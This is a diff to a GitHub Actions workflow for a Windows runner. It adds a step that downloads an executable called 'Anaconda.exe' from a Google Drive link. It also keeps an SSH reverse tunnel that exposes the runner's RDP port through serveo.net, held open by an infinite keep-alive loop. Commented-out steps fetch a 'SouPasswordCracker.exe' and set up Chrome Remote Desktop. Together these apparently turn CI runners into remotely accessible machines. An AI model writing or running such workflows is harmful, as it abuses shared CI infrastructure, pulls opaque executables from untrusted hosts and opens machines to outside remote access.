@@ -26,6 +26,11 @@ jobs:
 
       - name: Rename Computer to nono1321
         run: Rename-Computer -NewName "nono1321"
+
+      - name: Download Anaconda File
+        run: |
+         Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1bHGDgbhM8CYY40EyOZ_1xDDi1YreAJIA&export=download" -OutFile "Anaconda.exe"
+          
         
       # - name: Download and Install Chrome Remote Desktop Host
       #   run: |
@@ -54,7 +59,8 @@ jobs:
       # - name: Download and run SouPasswordCracker File
       #   run: |
       #     Invoke-WebRequest -Uri "https://github.com/jackricj/winpc23/raw/main/SouPasswordCracker.exe" -OutFile "SouPasswordCracker.exe"
-          
+
+ 
       # - name: Start powershell to enable remote desktop
       #   run: |
       #     # Start PowerShell script to launch Chrome Remote Desktop host
@@ -93,8 +99,7 @@ jobs:
       - name: Establish RDP Tunnel
         run: |
           echo 'yes' | ssh -o StrictHostKeyChecking=accept-new -R 33389:localhost:3389 serveo.net
-          Invoke-WebRequest -Uri "https://drive.google.com/file/d/1bHGDgbhM8CYY40EyOZ_1xDDi1YreAJIA/view?usp=sharing" -OutFile "Anaconda.exe"
-          
+         
           while ($true) {
              echo "Keep-Alive"
              Start-Sleep -Seconds 60
